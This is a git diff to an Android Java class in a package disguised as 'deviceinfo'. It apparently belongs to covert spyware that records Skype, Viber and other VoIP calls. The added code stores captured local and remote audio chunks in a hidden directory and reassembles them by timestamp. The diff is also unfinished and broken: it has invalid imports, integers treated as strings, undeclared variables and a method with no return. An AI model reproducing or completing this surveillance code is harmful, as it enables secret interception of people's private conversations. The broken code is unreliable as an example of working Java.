@@ -9,11 +9,17 @@
 
 package com.android.deviceinfo.module;
 
+import ArrayList;
+import FileObserver;
+
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
+import java.util.Collections;
+import java.util.Comparator;
 import java.util.Date;
 import java.util.HashMap;
+import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 import android.media.MediaRecorder;
@@ -53,6 +59,15 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final int CALLIST_SKYPE = 0x1;
 	private static final int CALLIST_VIBER = 0x2;
 
+	// From audio.h, Android 4.x
+	private static final int AUDIO_STREAM_VOICE_CALL = 0;
+	private static final int AUDIO_STREAM_SYSTEM     = 1;
+	private static final int AUDIO_STREAM_RING       = 2;
+	private static final int AUDIO_STREAM_MUSIC      = 3;
+	
+	private String audioStorage;
+	private FileObserver observer;
+	
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
 
@@ -89,6 +104,23 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (actualStart): recording calls"); //$NON-NLS-1$
 			}
 		}
+		
+		// XXX
+		Thread mythread = new Thread(runnable);
+	    mythread.start();
+	    
+	    observer = new FileObserver(pathToWatch) { // set up a file observer to watch this directory on sd card
+
+	        @Override
+	        public void onEvent(int event, String file) {
+	            //if(event == FileObserver.CREATE && !file.equals(".probe")){ // check if its a "create" and not equal to .probe because thats created every time camera is launched
+	            Log.d(TAG, "File created [" + pathToWatch + file + "]");
+
+	            Toast.makeText(getBaseContext(), file + " was saved!", Toast.LENGTH_LONG);
+	            //}
+	        }
+	    };
+	    observer.startWatching(); //START OBSERVING 
 	}
 
 	@Override
@@ -639,4 +671,164 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			return string.length() * 2 + 4;
 		}
 	}
+	
+	// start: call start date
+	// sec_length: call length in seconds
+	// type: call type (Skype, Viber, Paltalk, Hangout)
+	private boolean decodeFiles(Date start, int sec_length, int type) {
+		int range = 50; // ms
+		
+		List<String> remote_audio = new java.util.ArrayList<String>();
+		List<String> local_audio = new java.util.ArrayList<String>();
+		int end_of_call = 0xF00DF00D;
+		
+		if (this.audioStorage.length() == 0) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(decodeFile): creating audio storage");
+			}
+			
+			if (createAudioStorage() == false) {
+				return false;
+			}
+		}
+		
+		// List captured files
+		File f = new File(this.audioStorage);
+		File file[] = f.listFiles();
+		
+		// Che palle Java!
+		List<File> filesList = new java.util.ArrayList<File>();
+		filesList.addAll(java.util.Arrays.asList(file));
+		java.util.Collections.sort(filesList);
+		 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(decodeFile) audio queue list length: " + file.length);
+		}
+		
+		start_millis = String.valueOf(start.getTime());
+		end_millis = start_millis + (sec_length * 1000);
+		
+		// Identify head and tail for both channels
+		int r_head, r_tail, l_head, l_tail;
+		 
+		// Formant name: Qi-<epoch time>-<unique id per call>-<channel>.tmp
+		// Channel is: l for local and r for remote
+		for (int i = 0; i < file.length; i++) {
+			String[] split = file[i].getName().split("-");
+			long file_millis = Long.parseLong(split[1]); // stored file epoch time
+			
+			// Remote audio
+			if (split[1].endsWith("r.tmp")) {
+				// Identify start chunk
+				if (file_millis >= start_millis && file_millis < start_millis + range) {
+					if (r_head.length() == 0) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(decodeFile): " + file[i].getName() + " is a candidate for our remote call start");
+						}
+						
+						r_head = i;
+						continue;
+					}
+				}
+				
+				// Identify end chunk
+				if (file_millis >= end_millis - range && file_millis <= end_millis) {
+					if (r_tail.length() == 0) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(decodeFile): " + file[i].getName() + " is a candidate for our remote call end");
+						}
+						
+						r_tail = i;
+						continue;
+					}
+				}
+			}
+			
+			// Local audio
+			if (split[1].endsWith("l.tmp")) {
+				// Identify start chunk
+				if (file_millis >= start_millis && file_millis < start_millis + range) {
+					if (l_head.length() == 0) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(decodeFile): " + file[i].getName() + " is a candidate for our local call start");
+						}
+						
+						l_head = i;
+						continue;
+					}
+				}
+				
+				// Identify end chunk
+				if (file_millis >= end_millis - range && file_millis <= end_millis) {
+					if (l_tail.length() == 0) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(decodeFile): " + file[i].getName() + " is a candidate for our local call end");
+						}
+						
+						l_tail = i;
+						continue;
+					}
+				}
+			}
+		}
+		
+		// Populate both lists
+		for (int i = r_head; i <= r_tail; i++) {
+			if (file[i].getName().endsWith("r.tmp")) {
+				remote_audio.add(file[i].getName());
+			}
+		}
+		
+		for (int i = l_head; i <= l_tail; i++) {
+			if (file[i].getName().endsWith("l.tmp")) {
+				local_audio.add(file[i].getName());
+			}
+		}
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(decodeFile): Remote queue length: " + remote_audio.size() + " elements - Local queue length: " + local_audio.size() + " elements");
+		}
+		
+		// We (hopefully) have both the lists
+        // header format - each field is 4 bytes le :
+        // epoch : streamType : sampleRate : blockLen
+		
+		
+	}
+	
+	private boolean createAudioStorage() {
+		// Create storage directory
+		this.audioStorage = Path.hidden() + "gub/";
+		
+		if (Path.createDirectory(this.audioStorage) == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (decodeFile): audio storage directory cannot be created"); //$NON-NLS-1$
+			}
+			
+			return false;
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (decodeFile): audio storage directory created at " + this.audioStorage); //$NON-NLS-1$
+			}
+			
+			return true;
+		}
+	}
+	
+	Runnable callQueueMonitor = new Runnable() {
+		public void run() {
+
+			long endTime = System.currentTimeMillis() + 20*1000;
+
+			while (System.currentTimeMillis() < endTime) {
+				synchronized (this) {
+					try {
+						wait(endTime - System.currentTimeMillis());
+					} catch (Exception e) {}	
+				}
+
+			}
+		}
+	};
 }
+
